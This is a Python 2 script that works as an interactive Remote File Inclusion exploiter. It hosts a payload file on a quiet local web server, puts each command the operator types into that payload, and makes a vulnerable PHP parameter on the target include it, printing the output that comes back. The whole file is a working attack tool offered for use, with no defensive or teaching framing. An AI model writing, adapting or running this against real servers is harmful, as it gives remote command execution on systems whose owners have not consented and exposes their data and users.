#!/usr/bin/python

import sys
import urllib2
import SimpleHTTPServer
import SocketServer
import threading

class RfiExploiter:

	def __init__(self, target_uri, payload_path, payload_uri, placeholder="PLACEHOLDER"):
		self.target_uri = target_uri
		self.payload_path = payload_path
		self.payload_uri = payload_uri
		self.placeholder = placeholder

	def run(self):
		original_data = ""
        	with open(self.payload_path, 'r') as file:
                	payload_data = file.read()
			original_data = payload_data

		while 1:
                	cmd = raw_input("> ")
                        if cmd == "exit" or cmd == "quit":
                        	break
                        else:
				try:
			        	with open(self.payload_path, 'w') as file:
						payload_data = original_data.replace(self.placeholder, cmd)
				               	file.write(payload_data)
					contents = urllib2.urlopen(self.target_uri + self.payload_uri).read()
					print contents

				except:
					pass

				finally:
			        	with open(self.payload_path, 'w') as file:
				               	file.write(original_data)

if __name__ == "__main__":
	address = "0.0.0.0"
	port = 8888

	class QuietHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
		def log_message(self, format, *args):
			pass

	if len(sys.argv) == 3:
		try:
		        handler = QuietHandler
        		handler.server_version = ""
	        	handler.sys_version = ""

	        	SocketServer.TCPServer.allow_reuse_address=True
			httpd = SocketServer.TCPServer((address, port), handler)

			rfix = RfiExploiter(sys.argv[1], sys.argv[2], "http://{0}:{1}/{2}".format(address, port, sys.argv[2]))

			httpd_thread = threading.Thread(target=httpd.serve_forever)
			httpd_thread.start()

			rfix.run()

		except:
			pass
		finally:
			httpd.shutdown()
			httpd.server_close()

	else:
		print("Usage: {0} target_uri payload_path. Example: {0} http://target_host/index.php?flawed_param= php.txt".format(sys.argv[0]))
